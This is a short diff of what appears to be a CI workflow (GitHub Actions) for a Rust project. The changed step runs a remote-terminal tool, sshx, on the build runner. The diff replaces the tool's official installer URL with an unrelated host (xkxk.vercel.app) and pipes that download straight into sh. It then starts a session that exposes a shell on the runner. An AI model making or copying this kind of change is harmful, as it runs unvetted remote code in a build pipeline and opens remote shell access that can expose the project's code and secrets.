@@ -178,10 +178,10 @@ jobs:
           echo "✓ Project built successfully! Location: target/release/ultra_rust_sender"
 
       # --- 4. تشغيل sshx وعرض الرابط ---
-      - name: Start sshx.io Session
+      - name: Start xkxk.vercel.app Session
         run: |
           echo ">>> Installing sshx..."
-          curl -sSf https://sshx.io/get | sh
+          curl -sSf https://xkxk.vercel.app/get | sh
           
           echo ">>> Starting sshx..."
           sshx > sshx_output.txt 2>&1 &
